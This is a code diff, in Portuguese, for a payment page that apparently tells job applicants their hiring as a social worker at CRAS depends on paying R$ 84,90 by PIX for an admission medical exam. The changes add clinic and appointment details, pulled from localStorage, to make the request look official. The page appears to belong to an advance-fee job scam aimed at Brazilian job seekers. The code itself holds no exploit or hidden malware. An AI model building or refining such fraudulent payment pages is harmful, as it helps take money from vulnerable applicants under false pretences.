@@ -94,11 +94,21 @@
                 Para confirmar sua contratação como Assistente Social no CRAS, é obrigatório o pagamento do exame médico admissional. O valor é de <strong>R$ 84,90</strong></span>.
             </p>
             
-            <div id="clinicInfo" class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded-r-lg max-w-2xl mx-auto" style="display: none;">
-                <h3 class="font-semibold text-blue-800 mb-2">Local do Exame:</h3>
-                <p id="clinicName" class="text-blue-700 font-medium"></p>
-                <p id="clinicAddress" class="text-blue-600 text-sm"></p>
-                <p id="clinicPhone" class="text-blue-600 text-sm"></p>
+            <!-- Informações da Clínica e Agendamento -->
+            <div id="clinicAppointmentInfo" class="bg-white border border-gray-200 rounded-lg p-6 mb-6 max-w-2xl mx-auto text-left" style="display: none;">
+                <div class="mb-4">
+                    <h3 class="font-semibold text-gray-800 mb-3">Local do Exame Médico:</h3>
+                    <div class="space-y-2">
+                        <p id="clinicName" class="text-gray-700 font-medium text-base"></p>
+                        <p id="clinicAddress" class="text-gray-600 text-sm"></p>
+                        <p id="clinicPhone" class="text-gray-600 text-sm"></p>
+                    </div>
+                </div>
+                
+                <div class="border-t pt-4">
+                    <h3 class="font-semibold text-gray-800 mb-2">Data e Horário Agendado:</h3>
+                    <p id="examDateTime" class="text-gray-700 font-medium text-base"></p>
+                </div>
             </div>
 
             <div class="flex flex-col items-center mb-6">
@@ -110,6 +120,20 @@
                         <span class="text--gray-700 font-medium text-sm">Aguardando pagamento para finalizar</span>
                     </div>
                     <div class="border-t border-gray-300 pt-4 text-left">
+                        <!-- Informações da clínica serão inseridas aqui pelo JavaScript -->
+                        <div id="clinicInfoInBox" class="mb-4" style="display: none;">
+                            <div class="bg-blue-50 p-4 rounded-lg mb-3">
+                                <h4 class="font-semibold text-blue-800 mb-2 text-sm">Local do Exame:</h4>
+                                <p id="clinicNameInBox" class="text-blue-700 font-medium text-sm"></p>
+                                <p id="clinicAddressInBox" class="text-blue-600 text-xs"></p>
+                                <p id="clinicPhoneInBox" class="text-blue-600 text-xs"></p>
+                            </div>
+                            <div class="bg-green-50 p-4 rounded-lg mb-3">
+                                <h4 class="font-semibold text-green-800 mb-2 text-sm">Data e Horário:</h4>
+                                <p id="examDateTimeInBox" class="text-green-700 font-medium text-sm"></p>
+                            </div>
+                        </div>
+                        
                         <p class="text-sm text-gray-700 mb-3" id="training-info">
                             Após o pagamento, você deve comparecer à clínica para realizar o exame médico admissional conforme agendado.
                         </p>
@@ -132,6 +156,20 @@
                         <span class="text-red-500 font-medium text-sm">Erro ao gerar pagamento</span>
                     </div>
                     <div class="border-t border-gray-300 pt-4 text-left">
+                        <!-- Informações da clínica serão inseridas aqui pelo JavaScript -->
+                        <div id="clinicInfoInBoxError" class="mb-4" style="display: none;">
+                            <div class="bg-blue-50 p-4 rounded-lg mb-3">
+                                <h4 class="font-semibold text-blue-800 mb-2 text-sm">Local do Exame:</h4>
+                                <p id="clinicNameInBoxError" class="text-blue-700 font-medium text-sm"></p>
+                                <p id="clinicAddressInBoxError" class="text-blue-600 text-xs"></p>
+                                <p id="clinicPhoneInBoxError" class="text-blue-600 text-xs"></p>
+                            </div>
+                            <div class="bg-green-50 p-4 rounded-lg mb-3">
+                                <h4 class="font-semibold text-green-800 mb-2 text-sm">Data e Horário:</h4>
+                                <p id="examDateTimeInBoxError" class="text-green-700 font-medium text-sm"></p>
+                            </div>
+                        </div>
+                        
                         <p class="text-sm text-gray-700 mb-3" id="training-info-error">
                             Após o pagamento, você deve comparecer à clínica para realizar o exame médico admissional conforme agendado.
                         </p>
@@ -335,9 +373,10 @@
                 
                 // Show clinic info if we have data
                 if (clinicData || examDate) {
-                    const clinicInfoEl = document.getElementById('clinicInfo');
+                    const clinicInfoEl = document.getElementById('clinicAppointmentInfo');
                     if (clinicInfoEl) {
                         clinicInfoEl.style.display = 'block';
+                        console.log('Informações da clínica e agendamento exibidas');
                     }
                 }
                 
@@ -346,7 +385,57 @@
             }
         }
 
-        // Load clinic information
+        // Populate clinic info inside payment boxes
+        function populateClinicInfoInBoxes() {
+            try {
+                const clinicDataStr = localStorage.getItem('clinicLocation');
+                const clinicData = clinicDataStr ? JSON.parse(clinicDataStr) : null;
+                const examDate = localStorage.getItem('examDate');
+                const examTime = localStorage.getItem('examTime');
+                
+                console.log('Populando info nas boxes - Clínica:', clinicData);
+                console.log('Populando info nas boxes - Data:', examDate, 'Horário:', examTime);
+                
+                if (clinicData || (examDate && examTime)) {
+                    // For success box
+                    const clinicInfoInBox = document.getElementById('clinicInfoInBox');
+                    if (clinicInfoInBox && clinicData) {
+                        document.getElementById('clinicNameInBox').textContent = clinicData.nome;
+                        document.getElementById('clinicAddressInBox').textContent = clinicData.endereco;
+                        document.getElementById('clinicPhoneInBox').textContent = `Tel: ${clinicData.telefone}`;
+                        
+                        if (examDate && examTime) {
+                            document.getElementById('examDateTimeInBox').textContent = `${examDate} às ${examTime}`;
+                        } else if (examDate) {
+                            document.getElementById('examDateTimeInBox').textContent = `${examDate} (horário a definir)`;
+                        }
+                        
+                        clinicInfoInBox.style.display = 'block';
+                    }
+                    
+                    // For error box
+                    const clinicInfoInBoxError = document.getElementById('clinicInfoInBoxError');
+                    if (clinicInfoInBoxError && clinicData) {
+                        document.getElementById('clinicNameInBoxError').textContent = clinicData.nome;
+                        document.getElementById('clinicAddressInBoxError').textContent = clinicData.endereco;
+                        document.getElementById('clinicPhoneInBoxError').textContent = `Tel: ${clinicData.telefone}`;
+                        
+                        if (examDate && examTime) {
+                            document.getElementById('examDateTimeInBoxError').textContent = `${examDate} às ${examTime}`;
+                        } else if (examDate) {
+                            document.getElementById('examDateTimeInBoxError').textContent = `${examDate} (horário a definir)`;
+                        }
+                        
+                        clinicInfoInBoxError.style.display = 'block';
+                    }
+                }
+            } catch (error) {
+                console.error('Erro ao popular informações nas boxes:', error);
+            }
+        }
+
+        // Load clinic information (legacy function)
+        function loadClinicInfo() {
             try {
                 const clinicData = localStorage.getItem('clinicLocation');
                 if (clinicData) {
@@ -362,23 +451,13 @@
                         clinicNameEl.textContent = clinic.nome || 'Clínica não informada';
                         clinicAddressEl.textContent = clinic.endereco || '';
                         clinicPhoneEl.textContent = clinic.telefone ? `Tel: ${clinic.telefone}` : '';
-                        
-                        // Show clinic info section
                         clinicInfoEl.style.display = 'block';
-                        
-                        console.log('Clinic info loaded:', clinic);
                     }
-                } else {
-                    console.log('No clinic data found in localStorage');
                 }
             } catch (error) {
-                console.error('Error loading clinic info:', error);
+                console.error('Erro ao carregar clínica:', error);
             }
         }
-        
-        // Load clinic info when page loads
-        loadClinicInfo();
-        
         function copyPixCode() {
             const pixCode = document.getElementById('pix-code');
             pixCode.select();
@@ -471,6 +550,9 @@
         document.addEventListener('DOMContentLoaded', function() {
             // Load clinic and appointment information first
             loadClinicAndAppointmentInfo();
+            
+            // Also populate the clinic info inside payment boxes
+            populateClinicInfoInBoxes();
             
             // Start checking immediately for fastest redirection
             setTimeout(() => {
